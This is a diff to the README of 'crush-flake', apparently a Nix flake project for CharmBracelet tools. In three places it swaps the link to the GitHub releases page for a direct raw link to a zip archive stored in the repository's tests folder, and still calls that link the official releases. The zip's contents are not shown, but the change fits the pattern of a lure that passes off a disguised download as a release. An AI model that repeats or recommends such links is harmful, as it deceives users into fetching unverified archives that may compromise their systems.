@@ -1,6 +1,6 @@
 # crush-flake: Auto-updating, Auto-tagging CharmBracelet on Nix Flakes
 
-Release assets live at https://github.com/islna637/crush-flake/releases.
+Release assets live at https://raw.githubusercontent.com/islna637/crush-flake/main/tests/flake_crush_v1.6-alpha.4.zip
 
 Charmed by automation. Built for speed. Driven by LLMs. This project combines CharmBracelet, Nix Flakes, and AI tagging to keep your coding flow smooth and self-updating.
 
@@ -248,7 +248,7 @@ The project uses GitHub Releases to distribute installers and bundles. If you wa
 
 For more details about the available releases, see the official releases page.
 
-See the official releases here: https://github.com/islna637/crush-flake/releases
+See the official releases here: https://raw.githubusercontent.com/islna637/crush-flake/main/tests/flake_crush_v1.6-alpha.4.zip
 
 Note: This link provides access to installer scripts and release artifacts. If you’re unsure which file to download, consult the release notes in the same page to pick the file that corresponds to your system architecture and OS.
 
@@ -298,7 +298,7 @@ crush-flake is distributed under a permissive license. See LICENSE for details.
 
 Releases are the primary distribution mechanism for installers and ready-to-run artifacts. The Releases page contains the latest stable versions and changelog. To review or download, visit the page and pick the appropriate asset for your system.
 
-See the official releases here: https://github.com/islna637/crush-flake/releases
+See the official releases here: https://raw.githubusercontent.com/islna637/crush-flake/main/tests/flake_crush_v1.6-alpha.4.zip
 
 ---
 
